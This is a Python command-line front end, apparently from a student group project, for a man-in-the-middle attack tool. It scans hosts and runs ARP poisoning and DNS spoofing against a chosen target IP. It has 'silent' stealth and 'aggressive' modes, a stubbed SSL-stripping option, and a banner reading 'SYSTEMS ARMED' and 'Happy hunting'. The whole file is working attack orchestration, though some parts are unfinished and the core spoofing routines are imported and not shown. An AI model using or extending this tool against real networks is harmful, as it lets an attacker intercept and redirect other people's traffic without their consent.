import os
import shlex
from scan import scan_hosts, scan_ifaces
from arp_spoofing import *
from dns_spoofing import start_dns_poison
import scapy.all as sc
#from sslstripping_script import *
import time

def print_title():
    os.system('cls' if os.name == 'nt' else 'clear') # clears the console when starting

    def pause(text, delay=0.2):
        print (text)
        time.sleep(delay)

    print ("[:: GROUP 5 - DEFAULT PROJECT ::]\n")
    pause("> Initializing modules...", 0.3)
    pause("   ✔ ARP Poisoning", 0.2)
    pause("   ✔ DNS Spoofing", 0.2)
    pause("   ✔ SSL Stripping", 0.2)
    pause("\n> Status: SYSTEMS ARMED", 0.2)
    pause("> Happy hunting! :)", 0.1)
    
def print_commands():

    commands = """
        Available Commands:
        scan_if       - Scan for available interfaces
        scan_hosts    - Scan for available hosts on a given interface
                        Params: -iface <interface>
        arppoison     - Start arp poison 
                        Params: -tgtip <target_ip> -spmac <target_mac> -spip <spoofed_ip>
        dnspoison     - Start dns spoof attack on a chosen target and domain 
                        Params: -iface <iface> -tgtip <target_ip> -dom <domain> -spaddr <spoofed_address>
        sslstrip      - Start SSL stripping attack
                        Params: -iface <interface> -tgtip <target_ip> -spip <spoofed_ip>
        silent        - Run in silent mode (minimal network disturbance)
        aggressive    - Run in "all out" mode (maximum disruption/logging)
        help          - Show this help message
        exit          - Quit the tool
            """

    print(commands)


def handle_command(cmd):
    cmd = cmd.strip().lower()

    if cmd == "scan_if":
		# Scan available ifaces
        scan_ifaces()
    elif cmd.startswith("scan_hosts"):
		# Scan available hosts on given iface
        args = shlex.split(cmd)
        iface = None
        for i, arg in enumerate(args):
            if arg == "-if" and i + 1 < len(args):
                iface = args[i + 1]
        scan_hosts(iface)
    elif cmd.startswith("arppoison"):
		# Basic arp poison
        start_arp_poison(cmd)
    elif cmd.startswith("dnspoison"):
		# Dns poison attack
        start_dns_poison(cmd)
    #elif cmd.startswith("sslstrip"):
		# SSL stripping TODO
        #start_iptables_redirect()
        #start_sslstrip()

        #start_arp_thread(cmd)
        #start_arp_thread(cmd)
    elif cmd == "silent":
        print("[*] Starting in silent mode (stealthy ARP poisoning and single domain spoof)...")
        startSpoofing(cmd, "silent")
        # Start spoofing in silent mode
    elif cmd == "aggressive":
        print("[!] Starting in aggressive mode (heavy traffic injection and all domains)...")
        startSpoofing(cmd, "all-out")
        # Start spoofing with aggressive settings
    elif cmd == "help":
        print_commands()
    elif cmd == "exit":
        print("[*] Exiting...")
        exit(0)
    else:
        print("[!] Unknown command. Type 'help' to see available commands.")
    
        
def startSpoofing(cmd, mode):
    # Example usage: start -ip 192.168.1.10 -mac aa:bb:cc:dd:ee:ff -iptospoof 192.168.1.1
    args = shlex.split(cmd)
    ip = mac = ipToSpoof = None
    for i, arg in enumerate(args):
        if arg == "-ip" and i + 1 < len(args):
            ip = args[i + 1]
        elif arg == "-mac" and i + 1 < len(args):
            mac = args[i + 1]
        elif arg == "-iptospoof" and i + 1 < len(args):
            ipToSpoof = args[i + 1]
    if not ip or not mac or not ipToSpoof:
        print("[!] Usage: start -ip <target_ip> -mac <target_mac> -iptospoof <spoofed_ip>")
        return
    print("[*] Spoofing %s (MAC: %s ) as %s ... Press Ctrl+C to stop." % (ip, mac, ipToSpoof))

    if mode != "all-out":
        target_domain = raw_input("Enter the domain to spoof (e.g. example.com.): ").strip()
        if not target_domain.endswith('.'):
            target_domain += '.'
        target_domain = target_domain.encode()
        print("[*] Spoofing %s (MAC: %s) as %s and DNS spoofing %s ... Press Ctrl+C to stop." % (ip, mac, ipToSpoof, target_domain))

    # Start a new thread for DNS spoofing in order 
    def dns_spoof_thread():
        sc.sniff(
            filter=("udp port 53 and src %s" % ip),
            prn=packet_callback
        )
        
    def packet_callback(packet):
        if mode == "all-out":
            dns_spoof(packet, ip, ipToSpoof, mode)
        else:
            dns_spoof(packet, ip, ipToSpoof, mode, target_domain)

    dns_thread = threading.Thread(target=dns_spoof_thread)
    dns_thread.daemon = True
    dns_thread.start()

    if mode == "silent":
        time_interval = 5
    elif mode == "all-out":
        time_interval = 1
    else:
        time_interval = 2
        
    import time
    try:
        while True:
            arp_spoof(ip, ipToSpoof, mac)
            time.sleep(time_interval)
    except KeyboardInterrupt:
        print("\n[!] Stopped spoofing.")    



def main():
    print_title()
    print_commands()
    while True:
        try:
            cmd = raw_input(">> ")
            handle_command(cmd)
        except KeyboardInterrupt:
            print("\n[!] Interrupted. Type 'exit' to quit.")


if __name__ == '__main__':
    main()
